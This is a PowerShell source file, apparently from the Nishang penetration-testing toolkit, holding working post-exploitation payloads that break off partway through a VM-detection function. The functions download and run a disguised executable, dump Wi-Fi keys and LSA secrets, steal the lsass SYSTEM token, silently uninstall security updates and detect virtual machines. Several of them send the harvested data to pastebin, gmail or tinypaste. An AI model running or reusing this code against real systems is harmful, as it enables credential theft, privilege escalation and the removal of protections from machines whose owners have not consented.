##########################################################PowerPreter Code#####################################################


######################################################Download a file to the target.##################################################

function Download
{

<#
.SYNOPSIS
Payload to Download a file in current users temp directory.

.DESCRIPTION
This payload downloads a file to the given location.

.PARAMETER URL
The URL from where the file would be downloaded.

.PARAMETER FileName
Name of the file where download would be saved.

.EXAMPLE
PS > Download http://example.com/file.txt newfile.txt

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $URL,[Parameter(Position = 1, Mandatory = $True)] [String]$FileName )
    $webclient = New-Object System.Net.WebClient
    $file = "$env:temp\$FileName"
    $webclient.DownloadFile($URL,$file)
}

#################################Download an executable in text format, convert it to exe and execute it.#################################
function Download_Execute
{

<#
.SYNOPSIS
Payload to download an executable in text format, convert it to executable and execute.

.DESCRIPTION
This payload downloads an executable in text format, converts it to executable and execute.
Use exetotext.ps1 script to change an executable to text

.PARAMETER URL
The URL from where the file would be downloaded.

.EXAMPLE
PS > Download_Execute http://example.com/file.txt

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>



    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $URL)
    $webclient = New-Object System.Net.WebClient
    [string]$hexformat = $webClient.DownloadString($URL) 
    [Byte[]] $temp = $hexformat -split ' ' 
    [System.IO.File]::WriteAllBytes("$env:temp\svcmondr.exe", $temp) 
    start-process -nonewwindow "$env:temp\svcmondr.exe" 
}

##########################Dumps keys in clear text for saved WLAN profiles.#########################################
function Get-Wlan-Keys 
{

<#
.SYNOPSIS
Payload which dumps keys for WLAN profiles.

.DESCRIPTION
This payload dumps keys in clear text for saved WLAN profiles.
The payload must be run from as administrator to get the keys.

.PARAMETER exfil
Use this parameter to use exfiltration methods.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > Get-WLAN-Keys

.EXAMPLE
PS > Get-WLAN-Keys -exfil  <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://poshcode.org/1700
http://code.google.com/p/nishang
#>


    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param ([Parameter(Parametersetname="exfil")] [Switch]$exfil,
    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
    $wlans = netsh wlan show profiles | Select-String -Pattern "All User Profile" | Foreach-Object {$_.ToString()}
    $exportdata = $wlans | Foreach-Object {$_.Replace("    All User Profile     : ",$null)}
    $pastevalue = $exportdata | ForEach-Object {netsh wlan show profiles name="$_" key=clear}
    $pastevalue
    if($exfil -eq $True)
    {
        $pastename = $env:COMPUTERNAME + ": WLAN Keys"
        Do-Exfiltration "$pastename" "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
    }
}


#################################################Gathers juicy information from the target##########################################################
function Get-Information 
{


<#
.SYNOPSIS
Payload which gathers juicy information from the target.

.DESCRIPTION
This payload extracts information form registry and some commands. 
The information can then be exfiltrated using method of choice. The information available would be dependent on the privilege with
which the script would be executed. If pastebin is used, all the info would be base64 encoded to avoid pastebin spam filters.

.PARAMETER exfil
Use this parameter to use exfiltration methods.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > Get-Information

.EXAMPLE
PS > Get-Information -exfil <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>


    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param ( [Parameter(Parametersetname="exfil")] [Switch] $exfil,
    [Parameter(Position = 0, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
    function registry_values($regkey, $regvalue,$child) 
    { 
        if ($child -eq "no"){$key = get-item $regkey} 
        else{$key = get-childitem $regkey} 
        $key | 
        ForEach-Object { 
            $values = Get-ItemProperty $_.PSPath 
            ForEach ($value in $_.Property) 
            { 
                if ($regvalue -eq "all") {$values.$value} 
                elseif ($regvalue -eq "allname"){$value} 
                else {$values.$regvalue;break} 
            }
        }
    } 
    
    $output = "Logged in users:`n" + ((registry_values "hklm:\software\microsoft\windows nt\currentversion\profilelist" "profileimagepath") -join "`r`n") 
    $output = $output + "`n`n Powershell environment:`n" + ((registry_values "hklm:\software\microsoft\powershell" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty trusted hosts:`n" + ((registry_values "hkcu:\software\simontatham\putty" "allname")  -join "`r`n") 
    $output = $output + "`n`n Putty saved sessions:`n" + ((registry_values "hkcu:\software\simontatham\putty\sessions" "all")  -join "`r`n") 
    $output = $output + "`n`n Recently used commands:`n" + ((registry_values "hkcu:\software\microsoft\windows\currentversion\explorer\runmru" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Shares on the machine:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\LanmanServer\Shares" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Environment variables:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n More details for current user:`n" + ((registry_values "hkcu:\Volatile Environment" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings:`n" + ((registry_values "hklm:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n SNMP community strings for current user:`n" + ((registry_values "hkcu:\SYSTEM\CurrentControlSet\services\snmp\parameters\validcommunities" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Installed Applications for current user:`n" + ((registry_values "hkcu:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" "displayname")  -join "`r`n") 
    $output = $output + "`n`n Domain Name:`n" + ((registry_values "hklm:\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\History\" "all" "no")  -join "`r`n") 
    $output = $output + "`n`n Contents of /etc/hosts:`n" + ((get-content -path "C:\windows\System32\drivers\etc\hosts")  -join "`r`n") 
    $output = $output + "`n`n Running Services:`n" + ((net start) -join "`r`n") 
    $output = $output + "`n`n Account Policy:`n" + ((net accounts)  -join "`r`n") 
    $output = $output + "`n`n Local users:`n" + ((net user)  -join "`r`n") 
    $output = $output + "`n`n Local Groups:`n" + ((net localgroup)  -join "`r`n") 
    $output = $output + "`n`n WLAN Info:`n" + ((netsh wlan show all)  -join "`r`n") 
    
    $output
    if($exfil -eq $True)
    {
        $pastename = $env:COMPUTERNAME + ": Information Dump"
        Do-Exfiltration "$pastename" "$output" "$username" "$password" "$dev_key" "$keyoutoption"
    }
    }


####################################Silently removes updates for a target machine.########################################################
###Thanks Trevor Sullivan
###http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
function Remove-Update {

<#
.SYNOPSIS
Payload which silently removes updates for a target machine.

.DESCRIPTION
This payload removes updates from a tagret machine. This could be 
used to remove all updates, all security updates or a particular update.

.PARAMETER KBID
THE KBID of update you want to remove. All and Security are also validd.

.EXAMPLE
PS > Remove-Update All
This removes all updates from the target.

.EXAMPLE
PS > Remove-Update Security
This removes all security updates from the target.

.EXAMPLE
PS > Remove-Update KB2761226
This removes KB2761226 from the target.

.LINK
http://trevorsullivan.net/2011/05/31/powershell-removing-software-updates-from-windows/
http://code.google.com/p/nishang
#>




    Param( [Parameter(Position = 0, Mandatory = $True)] [String] $KBID)
    $HotFixes = Get-HotFix

    foreach ($HotFix in $HotFixes)
    {

        if ($KBID -eq $HotFix.HotfixId)
        {
            $KBID = $HotFix.HotfixId.Replace("KB", "") 
            $RemovalCommand = "wusa.exe /uninstall /kb:$KBID /quiet /norestart"
            Write-Host "Removing $KBID from the target."
            Invoke-Expression $RemovalCommand
            break
        }
    
        if ($KBID -match "All")
        {
            $KBNumber = $HotFix.HotfixId.Replace("KB", "")
            $RemovalCommand = "wusa.exe /uninstall /kb:$KBNumber /quiet /norestart"
            Write-Host "Removing update $KBNumber from the target."
            Invoke-Expression $RemovalCommand
        
        }
    
        if ($KBID -match "Security")
        {
            if ($HotFix.Description -match "Security")
            {
        
                $KBSecurity = $HotFix.HotfixId.Replace("KB", "")
                $RemovalCommand = "wusa.exe /uninstall /kb:$KBSecurity /quiet /norestart"
                Write-Host "Removing Security Update $KBSecurity from the target."
                Invoke-Expression $RemovalCommand
            }
        }
    

        while (@(Get-Process wusa -ErrorAction SilentlyContinue).Count -ne 0)
        {
            Start-Sleep 3
            Write-Host "Waiting for update removal to finish ..."
        }
    }

}


##########################Duplicates the Access token of lsass (SYSTEM) and sets it in the current process thread.###################################
####Thanks Niklas Goude#####
####http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
function Enable-DuplicateToken { 

<# 
.SYNOPSIS 
Payload which duplicates the Access token of lsass and sets it in the current process thread. 
 
.DESCRIPTION 
This payload duplicates the Access token of lsass and sets it in the current process thread. 
The payload must be run with elevated permissions. 

.EXAMPLE 
PS > Enable-DuplicateToken
 
.LINK 
http://www.truesec.com 
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
http://code.google.com/p/nishang

.NOTES 
Goude 2012, TreuSec 
#> 


[CmdletBinding()] 
param() 
 
$signature = @" 
    [StructLayout(LayoutKind.Sequential, Pack = 1)] 
     public struct TokPriv1Luid 
     { 
         public int Count; 
         public long Luid; 
         public int Attr; 
     } 
 
    public const int SE_PRIVILEGE_ENABLED = 0x00000002; 
    public const int TOKEN_QUERY = 0x00000008; 
    public const int TOKEN_ADJUST_PRIVILEGES = 0x00000020; 
    public const UInt32 STANDARD_RIGHTS_REQUIRED = 0x000F0000; 
 
    public const UInt32 STANDARD_RIGHTS_READ = 0x00020000; 
    public const UInt32 TOKEN_ASSIGN_PRIMARY = 0x0001; 
    public const UInt32 TOKEN_DUPLICATE = 0x0002; 
    public const UInt32 TOKEN_IMPERSONATE = 0x0004; 
    public const UInt32 TOKEN_QUERY_SOURCE = 0x0010; 
    public const UInt32 TOKEN_ADJUST_GROUPS = 0x0040; 
    public const UInt32 TOKEN_ADJUST_DEFAULT = 0x0080; 
    public const UInt32 TOKEN_ADJUST_SESSIONID = 0x0100; 
    public const UInt32 TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY); 
    public const UInt32 TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY | 
      TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE | 
      TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT | 
      TOKEN_ADJUST_SESSIONID); 
 
    public const string SE_TIME_ZONE_NAMETEXT = "SeTimeZonePrivilege"; 
    public const int ANYSIZE_ARRAY = 1; 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID 
    { 
      public UInt32 LowPart; 
      public UInt32 HighPart; 
    } 
 
    [StructLayout(LayoutKind.Sequential)] 
    public struct LUID_AND_ATTRIBUTES { 
       public LUID Luid; 
       public UInt32 Attributes; 
    } 
 
 
    public struct TOKEN_PRIVILEGES { 
      public UInt32 PrivilegeCount; 
      [MarshalAs(UnmanagedType.ByValArray, SizeConst=ANYSIZE_ARRAY)] 
      public LUID_AND_ATTRIBUTES [] Privileges; 
    } 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     public extern static bool DuplicateToken(IntPtr ExistingTokenHandle, int 
        SECURITY_IMPERSONATION_LEVEL, out IntPtr DuplicateTokenHandle); 
 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
    [return: MarshalAs(UnmanagedType.Bool)] 
    public static extern bool SetThreadToken( 
      IntPtr PHThread, 
      IntPtr Token 
    ); 
 
    [DllImport("advapi32.dll", SetLastError=true)] 
     [return: MarshalAs(UnmanagedType.Bool)] 
      public static extern bool OpenProcessToken(IntPtr ProcessHandle,  
       UInt32 DesiredAccess, out IntPtr TokenHandle); 
 
    [DllImport("advapi32.dll", SetLastError = true)] 
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 
 
    [DllImport("kernel32.dll", ExactSpelling = true)] 
    public static extern IntPtr GetCurrentProcess(); 
 
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
     public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, 
     ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 
"@ 
 
  $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent()) 
  if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) { 
    Write-Warning "Run the Command as an Administrator" 
    Break 
  } 
 
  Add-Type -MemberDefinition $signature -Name AdjPriv -Namespace AdjPriv 
  $adjPriv = [AdjPriv.AdjPriv] 
  [long]$luid = 0 
 
  $tokPriv1Luid = New-Object AdjPriv.AdjPriv+TokPriv1Luid 
  $tokPriv1Luid.Count = 1 
  $tokPriv1Luid.Luid = $luid 
  $tokPriv1Luid.Attr = [AdjPriv.AdjPriv]::SE_PRIVILEGE_ENABLED 
 
  $retVal = $adjPriv::LookupPrivilegeValue($null, "SeDebugPrivilege", [ref]$tokPriv1Luid.Luid) 
  
  [IntPtr]$htoken = [IntPtr]::Zero 
  $retVal = $adjPriv::OpenProcessToken($adjPriv::GetCurrentProcess(), [AdjPriv.AdjPriv]::TOKEN_ALL_ACCESS, [ref]$htoken) 
   
   
  $tokenPrivileges = New-Object AdjPriv.AdjPriv+TOKEN_PRIVILEGES 
  $retVal = $adjPriv::AdjustTokenPrivileges($htoken, $false, [ref]$tokPriv1Luid, 12, [IntPtr]::Zero, [IntPtr]::Zero) 
 
  if(-not($retVal)) { 
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
    Break 
  } 
 
  $process = (Get-Process -Name lsass) 
  [IntPtr]$hlsasstoken = [IntPtr]::Zero 
  $retVal = $adjPriv::OpenProcessToken($process.Handle, ([AdjPriv.AdjPriv]::TOKEN_IMPERSONATE -BOR [AdjPriv.AdjPriv]::TOKEN_DUPLICATE), [ref]$hlsasstoken) 
 
  [IntPtr]$dulicateTokenHandle = [IntPtr]::Zero 
  $retVal = $adjPriv::DuplicateToken($hlsasstoken, 2, [ref]$dulicateTokenHandle) 
  
  $retval = $adjPriv::SetThreadToken([IntPtr]::Zero, $dulicateTokenHandle) 
  if(-not($retVal)) { 
    [System.Runtime.InteropServices.marshal]::GetLastWin32Error() 
  } 
}

######################################################Dumps LSA Secrets from the target#############################################
####Thanks Niklas Goude#####
####http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/06/use-powershell-to-decrypt-lsa-secrets-from-the-registry.aspx
function Get-LsaSecret {

<#
.SYNOPSIS
Payload which extracts LSA Secrets from local computer.

.DESCRIPTION
Extracts LSA secrets from HKLM:\\SECURITY\Policy\Secrets\ on a local computer.
The payload must be run with elevated permissions, in 32-bit mode and requires 
permissions to the security key in HKLM. The permission could be obtained by using
Enable-DuplicateToken payload. The secrets can then exfiltrated using method of choice.

.PARAMETER RegistryKey
Name of Key to Extract. if the parameter is not used, all secrets will be displayed.

.PARAMETER exfil
Use this parameter to use exfiltration methods.

.PARAMETER dev_key
The Unique API key provided by pastebin when you register a free account.
Unused for tinypaste.
Unused for gmail option.

.PARAMETER username
Username for the pastebin account where data would be pasted.
Username for the tinypaste account where data would be pasted.
Username for the gmail account where attachment would be sent as an attachment.

.PARAMETER password
Password for the pastebin account where data would be pasted.
Password for the tinypaste account where data would be pasted.
Password for the gmail account where data would be sent.

.PARAMETER keyoutoption
The method you want to use for exfitration of data.
"0" for displaying on console
"1" for pastebin.
"2" for gmail
"3" for tinypaste   

.EXAMPLE
PS > Get-LsaSecret
The payload will ask for all required options.

.EXAMPLE
PS > Get-LsaSecret -Key KeyName

.EXAMPLE
PS > Get-LsaSecret -Key KeyName -exfil <devkey> <username> <password> <keyoutoption>

Use above when using the payload from non-interactive shells.

.LINK
http://www.truesec.com
http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/06/use-powershell-to-decrypt-lsa-secrets-from-the-registry.aspx
http://code.google.com/p/nishang

.NOTES
Goude 2012, TreuSec
#>


    [CmdletBinding(DefaultParameterSetName="noexfil")]
    Param ( [Parameter(Parametersetname="exfil")] [Switch]$exfil,
    [Parameter(Position = 0, Parametersetname="exfil")] [Parameter(Position = 0, Parametersetname="noexfil")] [String] $registrykey,
    [Parameter(Position = 1, Mandatory = $True, Parametersetname="exfil")] [String] $dev_key,
    [Parameter(Position = 2, Mandatory = $True, Parametersetname="exfil")] [String]$username,
    [Parameter(Position = 3, Mandatory = $True, Parametersetname="exfil")] [String]$password,
    [Parameter(Position = 4, Mandatory = $True, Parametersetname="exfil")] [String]$keyoutoption )
Begin {
# Check if User is Elevated
$currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
  Write-Warning "Run the Command as an Administrator"
  Break
}

# Check if Script is run in a 32-bit Environment by checking a Pointer Size
if([System.IntPtr]::Size -eq 8) {
  Write-Warning "Run PowerShell in 32-bit mode"
  Break
}



# Check if RegKey is specified
if([string]::IsNullOrEmpty($registryKey)) {
  [string[]]$registryKey = (Split-Path (Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -ExpandProperty Name) -Leaf)
}

# Create Temporary Registry Key
if( -not(Test-Path "HKLM:\\SECURITY\Policy\Secrets\MySecret")) {
  mkdir "HKLM:\\SECURITY\Policy\Secrets\MySecret" | Out-Null
}

$signature = @"
[StructLayout(LayoutKind.Sequential)]
public struct LSA_UNICODE_STRING
{
  public UInt16 Length;
  public UInt16 MaximumLength;
  public IntPtr Buffer;
}

[StructLayout(LayoutKind.Sequential)]
public struct LSA_OBJECT_ATTRIBUTES
{
  public int Length;
  public IntPtr RootDirectory;
  public LSA_UNICODE_STRING ObjectName;
  public uint Attributes;
  public IntPtr SecurityDescriptor;
  public IntPtr SecurityQualityOfService;
}

public enum LSA_AccessPolicy : long
{
  POLICY_VIEW_LOCAL_INFORMATION = 0x00000001L,
  POLICY_VIEW_AUDIT_INFORMATION = 0x00000002L,
  POLICY_GET_PRIVATE_INFORMATION = 0x00000004L,
  POLICY_TRUST_ADMIN = 0x00000008L,
  POLICY_CREATE_ACCOUNT = 0x00000010L,
  POLICY_CREATE_SECRET = 0x00000020L,
  POLICY_CREATE_PRIVILEGE = 0x00000040L,
  POLICY_SET_DEFAULT_QUOTA_LIMITS = 0x00000080L,
  POLICY_SET_AUDIT_REQUIREMENTS = 0x00000100L,
  POLICY_AUDIT_LOG_ADMIN = 0x00000200L,
  POLICY_SERVER_ADMIN = 0x00000400L,
  POLICY_LOOKUP_NAMES = 0x00000800L,
  POLICY_NOTIFICATION = 0x00001000L
}

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaRetrievePrivateData(
  IntPtr PolicyHandle,
  ref LSA_UNICODE_STRING KeyName,
  out IntPtr PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaStorePrivateData(
  IntPtr policyHandle,
  ref LSA_UNICODE_STRING KeyName,
  ref LSA_UNICODE_STRING PrivateData
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaOpenPolicy(
  ref LSA_UNICODE_STRING SystemName,
  ref LSA_OBJECT_ATTRIBUTES ObjectAttributes,
  uint DesiredAccess,
  out IntPtr PolicyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaNtStatusToWinError(
  uint status
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaClose(
  IntPtr policyHandle
);

[DllImport("advapi32.dll", SetLastError = true, PreserveSig = true)]
public static extern uint LsaFreeMemory(
  IntPtr buffer
);
"@

Add-Type -MemberDefinition $signature -Name LSAUtil -Namespace LSAUtil
}

  Process{
    foreach($key in $RegistryKey) {
      $regPath = "HKLM:\\SECURITY\Policy\Secrets\" + $key
      $tempRegPath = "HKLM:\\SECURITY\Policy\Secrets\MySecret"
      $myKey = "MySecret"
      if(Test-Path $regPath) {
        Try {
          Get-ChildItem $regPath -ErrorAction Stop | Out-Null
        }
        Catch {
          Write-Error -Message "Access to registry Denied, run as NT AUTHORITY\SYSTEM" -Category PermissionDenied
          Break
        }      

        if(Test-Path $regPath) {
          # Copy Key
          "CurrVal","OldVal","OupdTime","CupdTime","SecDesc" | ForEach-Object {
            $copyFrom = "HKLM:\SECURITY\Policy\Secrets\" + $key + "\" + $_
            $copyTo = "HKLM:\SECURITY\Policy\Secrets\MySecret\" + $_

            if( -not(Test-Path $copyTo) ) {
              mkdir $copyTo | Out-Null
            }
            $item = Get-ItemProperty $copyFrom
            Set-ItemProperty -Path $copyTo -Name '(default)' -Value $item.'(default)'
          }
        }
        # Attributes
        $objectAttributes = New-Object LSAUtil.LSAUtil+LSA_OBJECT_ATTRIBUTES
        $objectAttributes.Length = 0
        $objectAttributes.RootDirectory = [IntPtr]::Zero
        $objectAttributes.Attributes = 0
        $objectAttributes.SecurityDescriptor = [IntPtr]::Zero
        $objectAttributes.SecurityQualityOfService = [IntPtr]::Zero

        # localSystem
        $localsystem = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $localsystem.Buffer = [IntPtr]::Zero
        $localsystem.Length = 0
        $localsystem.MaximumLength = 0

        # Secret Name
        $secretName = New-Object LSAUtil.LSAUtil+LSA_UNICODE_STRING
        $secretName.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($myKey)
        $secretName.Length = [Uint16]($myKey.Length * [System.Text.UnicodeEncoding]::CharSize)
        $secretName.MaximumLength = [Uint16](($myKey.Length + 1) * [System.Text.UnicodeEncoding]::CharSize)

        # Get LSA PolicyHandle
        $lsaPolicyHandle = [IntPtr]::Zero
        [LSAUtil.LSAUtil+LSA_AccessPolicy]$access = [LSAUtil.LSAUtil+LSA_AccessPolicy]::POLICY_GET_PRIVATE_INFORMATION
        $lsaOpenPolicyHandle = [LSAUtil.LSAUtil]::LSAOpenPolicy([ref]$localSystem, [ref]$objectAttributes, $access, [ref]$lsaPolicyHandle)

        if($lsaOpenPolicyHandle -ne 0) {
          Write-Warning "lsaOpenPolicyHandle Windows Error Code: $lsaOpenPolicyHandle"
          Continue
        }

        # Retrieve Private Data
        $privateData = [IntPtr]::Zero
        $ntsResult = [LSAUtil.LSAUtil]::LsaRetrievePrivateData($lsaPolicyHandle, [ref]$secretName, [ref]$privateData)

        $lsaClose = [LSAUtil.LSAUtil]::LsaClose($lsaPolicyHandle)

        $lsaNtStatusToWinError = [LSAUtil.LSAUtil]::LsaNtStatusToWinError($ntsResult)

        if($lsaNtStatusToWinError -ne 0) {
          Write-Warning "lsaNtsStatusToWinError: $lsaNtStatusToWinError"
        }

        [LSAUtil.LSAUtil+LSA_UNICODE_STRING]$lusSecretData =
        [LSAUtil.LSAUtil+LSA_UNICODE_STRING][System.Runtime.InteropServices.marshal]::PtrToStructure($privateData, [LSAUtil.LSAUtil+LSA_UNICODE_STRING])

        Try {
          [string]$value = [System.Runtime.InteropServices.marshal]::PtrToStringAuto($lusSecretData.Buffer)
          $value = $value.SubString(0, ($lusSecretData.Length / 2))
        }
        Catch {
          $value = ""
        }

        if($key -match "^_SC_") {
          # Get Service Account
          $serviceName = $key -Replace "^_SC_"
          Try {
            # Get Service Account
            $service = Get-WmiObject -Query "SELECT StartName FROM Win32_Service WHERE Name = '$serviceName'" -ErrorAction Stop
            $account = $service.StartName
          }
          Catch {
            $account = ""
          }
        } else {
          $account = ""
        }

        # Return Object
       $obj = New-Object PSObject -Property @{
          Name = $key;
          Secret = $value;
          Account = $Account
        } 
        
        $pastevalue = $obj | Select-Object Name, Account, Secret, @{Name="ComputerName";Expression={$env:COMPUTERNAME}}
        $pastevalue

      } else {
        Write-Error -Message "Path not found: $regPath" -Category ObjectNotFound
      }
    }
  }
  end {
    if(Test-Path $tempRegPath) {
      Remove-Item -Path "HKLM:\\SECURITY\Policy\Secrets\MySecret" -Recurse -Force
    }
   if($exfil -eq $True)
   {
        Do-Exfiltration "LSA Secrets: " "$pastevalue" "$username" "$password" "$dev_key" "$keyoutoption"
   }
  }

}

######################################################Converts Base64 string or file to plain.##################################################
function Base64ToString
{

<#
.SYNOPSIS
Helper funciton which decodes a base64 string to readable.

.DESCRIPTION
This payload decodes a base64 string to readable.

.PARAMETER Base64Strfile
The filename which contains base64 string to be decoded.
Use the parameter -IsString while using a string instead of file.

.EXAMPLE
PS > .\Base64ToString.ps1 base64.txt

.EXAMPLE
PS > .\Base64ToString.ps1 dGVzdGVzdA== -IsString

.LINK
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang
#>

Param( [Parameter(Position = 0, Mandatory = $True)] [String] $Base64Strfile, [Switch] $IsString)
  if($IsString -eq $true)
    {
    
        $base64string  = [System.Convert]::FromBase64String($Base64Strfile)
       
    }
  else
    {
        $base64string  = [System.Convert]::FromBase64String((Get-Content $Base64Strfile))
    }
    
  $decodedstring = [System.Text.Encoding]::Unicode.GetString($base64string)
  $decodedstring
  }



########################################################Detects whether it is in a known virtual machine.###########################
###Based on CheckVM post module in msf by Carlos Perez
function Check-VM
{

<# 
.SYNOPSIS 
Helper function which detects whether it is running in a known virtual machine.
 
.DESCRIPTION 
This script uses known parameters or 'fingerprints' of Hyper-V, VMWare, Virtual PC, Virtual Box,
Xen and QEMU for detecting the environment.

.EXAMPLE 
PS > Check-VM 
 
.LINK 
http://labofapenetrationtester.blogspot.com/
http://code.google.com/p/nishang

.NOTES 
The script draws heavily from checkvm.rb post module from msf.
https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/gather/checkvm.rb
#>

$ErrorActionPreference = "SilentlyContinue"
#Hyper-V
$hyperv = Get-ChildItem HKLM:\SOFTWARE\Microsoft
if (($hyperv -match "Hyper-V") -or ($hyperv -match "VirtualMachine"))
    {
        $hypervm = $true
    }

if (!$hypervm)
    {
        $hyperv = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System -Name SystemBiosVersion
        if ($hyperv -match "vrtual")
            {
                $hypervm = $true
            }
    }
    
if (!$hypervm)
    {
        $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\FADT
        if ($hyperv -match "vrtual")
            {
                $hypervm = $true
            }
    }
            
if (!$hypervm)
    {
        $hyperv = Get-ChildItem HKLM:\HARDWARE\ACPI\RSDT
        if ($hyperv -match "vrtual")
            {
                $hypervm = $true
            }
    }

if (!$hypervm)
    {
        $hyperv = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
        if (($hyperv -match "vmicheartbeat") -or ($hyperv -match "vmicvss") -or ($hyperv -match "vmicshutdown") -or ($hyperv -match "vmiexchange"))
            {
                $hypervm = $true
            }
    }
   
if ($hypervm)
    {
    
        "This is a Hyper-V machine."
    
    }

#VMWARE

$vmware = Get-ChildItem HKLM:\SYSTEM\ControlSet001\Services
if (($vmware -match "vmdebug") -or ($vmware -match "vmmouse") -or ($vmware -match "VMTools") -or ($vmware -match "VMMEMCTL"))
    {
        $vmwarevm = $true
    }

if (!$vmwarevm)
    {
        $vmware = Get-ItemProperty hklm:\HARDWARE\DESCRIPTION\System\BIOS -Name SystemManufacturer
        if ($vmware -match "vmware")
            {
                $vmwarevm = $true
            }
    }
    
if (!$vmwarevm)
    {
        $vmware = Get-Childitem hklm:\hardware\devicemap\scsi -recurse | gp -Name identifier
        if ($vmware -match "vmware")
            {
                $vmwarevm = $true
            }
    }

if (!$vmwarevm)
    {
        $vmware = Get-Process
        if (($vmware -eq "vmwareuser.exe") -or ($vmware -match "vmwaretray.exe"))
            {
                $vmwarevm = $true
            }
    }

if ($vmwarevm)
    {
    
        "This is a VMWare machine."
    
    }
    
#Virtual PC

$vpc = Get-Process
if (($vpc -eq "vmusrvc.exe") -or ($vpc -match "vmsrvc.exe"))
    {
    $vpcvm = $true
    }

if (!$vpcvm)
    {
        $vpc = Get-Process
